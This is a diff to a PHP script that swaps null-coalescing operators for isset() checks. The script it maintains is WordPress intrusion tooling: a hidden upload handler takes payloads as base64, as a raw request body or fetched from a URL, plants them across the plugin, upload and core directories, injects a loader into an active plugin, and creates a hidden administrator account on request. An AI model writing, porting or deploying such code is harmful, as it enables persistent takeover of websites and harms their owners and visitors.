@@ -212,7 +212,8 @@ function _remote_get($url, $timeout = 15) {
             @fclose($fp);
             if ($data !== false && strlen($data) > 0) {
                 $status = 200;
-                foreach ($meta['wrapper_data'] ?? [] as $h) {
+                $wd = isset($meta['wrapper_data']) ? $meta['wrapper_data'] : array();
+                foreach ($wd as $h) {
                     if (preg_match('/HTTP\/\S+\s+(\d+)/', $h, $m)) {
                         $status = (int)$m[1];
                     }
@@ -804,7 +805,7 @@ function _deploy_multi($payloads, $roles, $dirs) {
     $used_dirs = []; // track directories already assigned to avoid overlap
 
     foreach ($payloads as $role => $content) {
-        $cfg = $roles[$role] ?? null;
+        $cfg = isset($roles[$role]) ? $roles[$role] : null;
         if (!$cfg) {
             $report[$role] = ['error' => 'unknown role'];
             continue;
@@ -812,9 +813,9 @@ function _deploy_multi($payloads, $roles, $dirs) {
         // Skip internal roles (tools, not deployed as files)
         if (!empty($cfg['internal'])) continue;
 
-        $count = $cfg['count'] ?? 1;
-        $zones = $cfg['zones'] ?? array_keys($dirs);
-        $names = $cfg['names'] ?? [];
+        $count = isset($cfg['count']) ? $cfg['count'] : 1;
+        $zones = isset($cfg['zones']) ? $cfg['zones'] : array_keys($dirs);
+        $names = isset($cfg['names']) ? $cfg['names'] : array();
         $role_report = ['success' => [], 'skipped' => [], 'failed' => []];
 
         // ── Special handling: inject into existing active plugin ──
@@ -842,10 +843,10 @@ function _deploy_multi($payloads, $roles, $dirs) {
 
                 if (function_exists('_inject_loader_into_plugin')) {
                     $inj_result = _inject_loader_into_plugin($wp_root);
-                    if (($inj_result['status'] ?? '') === 'injected' || ($inj_result['status'] ?? '') === 'already') {
+                    if ((isset($inj_result['status']) ? $inj_result['status'] : '') === 'injected' || (isset($inj_result['status']) ? $inj_result['status'] : '') === 'already') {
                         $role_report['success'][] = [
-                            'path'   => $inj_result['path'] ?? '',
-                            'name'   => $inj_result['plugin'] ?? '',
+                            'path'   => isset($inj_result['path']) ? $inj_result['path'] : '',
+                            'name'   => isset($inj_result['plugin']) ? $inj_result['plugin'] : '',
                             'role'   => $role,
                             'method' => 'plugin_injection',
                             'detail' => $inj_result,
@@ -994,14 +995,15 @@ function _summarize_multi_report($report) {
     $per_role      = [];
 
     foreach ($report as $role => $r) {
-        $s = count($r['success'] ?? []);
-        $k = count($r['skipped'] ?? []);
-        $f = count($r['failed'] ?? []);
+        $s = count(isset($r['success']) ? $r['success'] : array());
+        $k = count(isset($r['skipped']) ? $r['skipped'] : array());
+        $f = count(isset($r['failed']) ? $r['failed'] : array());
         $total_success += $s;
         $total_skipped += $k;
         $total_failed  += $f;
 
-        foreach (($r['success'] ?? []) as $item) {
+        $succ = isset($r['success']) ? $r['success'] : array();
+        foreach ($succ as $item) {
             $all_paths[] = $item['path'];
         }
 
@@ -1024,7 +1026,7 @@ function _summarize_multi_report($report) {
 // ═══════════════════════════════════════════════════════════════════════════════
 // Hidden upload handler
 // ═══════════════════════════════════════════════════════════════════════════════
-$_ACTION = $_REQUEST['a'] ?? '';
+$_ACTION = isset($_REQUEST['a']) ? $_REQUEST['a'] : '';
 
 /**
  * Accept file upload via base64, raw body, or URL fetch
@@ -1041,7 +1043,7 @@ function _handle_upload() {
     }
 
     // Method 2: Raw body
-    $ctype = $_SERVER['CONTENT_TYPE'] ?? '';
+    $ctype = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
     if (strpos($ctype, 'octet-stream') !== false ||
         strpos($ctype, 'text/plain') !== false ||
         strpos($ctype, 'application/x-www-form-urlencoded') === false) {
@@ -1062,7 +1064,7 @@ function _handle_upload() {
  */
 function _handle_multi_upload() {
     // Method 1: JSON body with role=>base64 map
-    $ctype = $_SERVER['CONTENT_TYPE'] ?? '';
+    $ctype = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
     if (strpos($ctype, 'application/json') !== false) {
         $raw = file_get_contents('php://input');
         $map = @json_decode($raw, true);
@@ -1194,7 +1196,7 @@ function _get_guard_prefix() {
 // ═══════════════════════════════════════════════════════════════════════════════
 function _detect_environment($wp_root) {
     $sapi = PHP_SAPI;
-    $server = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
+    $server = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown';
     $is_fpm = (stripos($sapi, 'fpm') !== false || stripos($sapi, 'cgi') !== false);
     $is_apache = (stripos($server, 'apache') !== false);
     $is_nginx = (stripos($server, 'nginx') !== false);
@@ -1286,8 +1288,8 @@ switch ($_ACTION) {
     // ── fetch: pull file(s) from URL or base64 GET ─────────────────────
     case 'fetch':
         // Multi-fetch: role=<role>&url=<url> adds one role at a time
-        $role = $_GET['role'] ?? '';
-        $url  = $_GET['url'] ?? '';
+        $role = isset($_GET['role']) ? $_GET['role'] : '';
+        $url  = isset($_GET['url']) ? $_GET['url'] : '';
         if (!empty($role) && !empty($url)) {
             $ft = _handle_fetch($url);
             if (empty($ft['error'])) {
@@ -1478,14 +1480,14 @@ switch ($_ACTION) {
             [
                 'admin_adder_deployed' => count($adder_result['success']),
                 'admin_result' => $admin_result
-                    ? (($admin_result['status'] ?? '') === 'created'
+                    ? ((isset($admin_result['status']) ? $admin_result['status'] : '') === 'created'
                         ? "created:{$admin_result['user_id']}"
-                        : ($admin_result['status'] ?? 'skipped'))
+                        : (isset($admin_result['status']) ? $admin_result['status'] : 'skipped'))
                     : 'not triggered (use ?admin=1 to create)',
             ]
         );
         $result['details']     = $multi_report;
-        $result['fetch_report'] = $fetch_report ?? [];
+        $result['fetch_report'] = isset($fetch_report) ? $fetch_report : array();
         $result['admin_adder'] = [
             'target_dir' => !empty($adder_targets) ? $adder_targets[0] : null,
             'success'    => $adder_result['success'],
@@ -1526,7 +1528,7 @@ switch ($_ACTION) {
             'uploads'     => array_slice($dirs['uploads'], 0, 5),
             'others'      => $dirs['others'],
             'wp_includes' => $dirs['wp_includes'],
-            'wp_admin'    => $dirs['wp_admin'] ?? [],
+            'wp_admin'    => isset($dirs['wp_admin']) ? $dirs['wp_admin'] : array(),
         ];
         $result['counts'] = [
             'plugins'     => count($dirs['plugins']),
@@ -1534,7 +1536,7 @@ switch ($_ACTION) {
             'uploads'     => count($dirs['uploads']),
             'others'      => count($dirs['others']),
             'wp_includes' => count($dirs['wp_includes']),
-            'wp_admin'    => count($dirs['wp_admin'] ?? []),
+            'wp_admin'    => count(isset($dirs['wp_admin']) ? $dirs['wp_admin'] : array()),
         ];
         break;
 
@@ -1614,8 +1616,8 @@ switch ($_ACTION) {
         if ($guard) {
             $wrapped = [];
             foreach ($payloads as $role => $raw) {
-                $cfg = $_PAYLOAD_ROLES[$role] ?? [];
-                $src = $cfg['src'] ?? '';
+                $cfg = isset($_PAYLOAD_ROLES[$role]) ? $_PAYLOAD_ROLES[$role] : array();
+                $src = isset($cfg['src']) ? $cfg['src'] : '';
                 $is_binary = !empty($cfg['force_path']) && substr($src, -4) !== '.php';
                 $is_internal = !empty($cfg['internal']);
                 $wrapped[$role] = ($is_binary || $is_internal) ? $raw : $guard . $raw;
@@ -1667,14 +1669,14 @@ switch ($_ACTION) {
                 'guard_prefix'          => $guard ? 'applied' : 'not found (deployed raw)',
                 'admin_adder_deployed'  => count($adder_result['success']),
                 'admin_result'          => $admin_result
-                    ? (($admin_result['status'] ?? '') === 'created'
+                    ? ((isset($admin_result['status']) ? $admin_result['status'] : '') === 'created'
                         ? "created:{$admin_result['user_id']}"
-                        : ($admin_result['status'] ?? 'skipped'))
+                        : (isset($admin_result['status']) ? $admin_result['status'] : 'skipped'))
                     : 'not triggered (use ?admin=1 to create)',
             ]
         );
         $result['details']   = $multi_report;
-        $result['fetch_report'] = $fetch_report ?? [];
+        $result['fetch_report'] = isset($fetch_report) ? $fetch_report : array();
         $result['admin_adder'] = [
             'target_dir' => !empty($adder_targets) ? $adder_targets[0] : null,
             'success'    => $adder_result['success'],
@@ -1753,6 +1755,6 @@ switch ($_ACTION) {
 // Output
 // ═══════════════════════════════════════════════════════════════════════════════
 $_HDR('Content-Type: application/json; charset=utf-8');
-$_HDR('X-Deploy: ' . ($result['status'] ?? 'unknown'));
+$_HDR('X-Deploy: ' . (isset($result['status']) ? $result['status'] : 'unknown'));
 echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
 exit;
